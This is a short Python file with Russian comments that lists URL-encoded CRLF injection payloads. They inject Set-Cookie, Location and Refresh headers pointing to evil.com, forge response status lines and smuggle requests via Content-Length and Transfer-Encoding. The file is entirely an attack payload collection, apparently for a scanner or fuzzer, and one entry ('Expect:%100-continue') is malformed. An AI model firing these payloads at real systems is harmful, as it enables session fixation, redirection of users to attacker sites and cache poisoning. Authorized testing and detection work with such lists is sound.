# -*- coding: utf-8 -*-

crlf_payloads = [
    "%0ASet-Cookie:%20crlf=true",              # Внедрение заголовка Set-Cookie
    "%0D%0ASet-Cookie:%20crlf=true",          # Внедрение заголовка Set-Cookie (дополнительный вариант)
    "%0D%0AContent-Type:%20text/html",       # Внедрение заголовка Content-Type
    "%0D%0ARefresh:%200;url=http://evil.com", # Внедрение заголовка Refresh
    "%0D%0ALocation:%20http://evil.com",     # Внедрение заголовка Location
    "HTTP/1.1%200%20OK%0D%0AContent-Length:%200%0D%0A%0D%0A", # Манипуляция ответом сервера
    "GET%20/search?q=test%20HTTP/1.1%0D%0AHost:%20example.com", # Манипуляция с запросом
    "Referer:%20http://evil.com%0D%0A",     # Внедрение заголовка Referer
    "User-Agent:%20Mozilla/5.0%0D%0A",      # Внедрение заголовка User-Agent
    "Proxy-Host:%20evil.com%0D%0A",         # Внедрение заголовка Proxy-Host
    "Content-Length:%200%0D%0A%0D%0A",      # Манипуляция заголовком Content-Length
    "Transfer-Encoding:%20chunked%0D%0A%0D%0A", # Внедрение Transfer-Encoding
    "Expect:%100-continue%0D%0A%0D%0A",     # Внедрение Expect
]
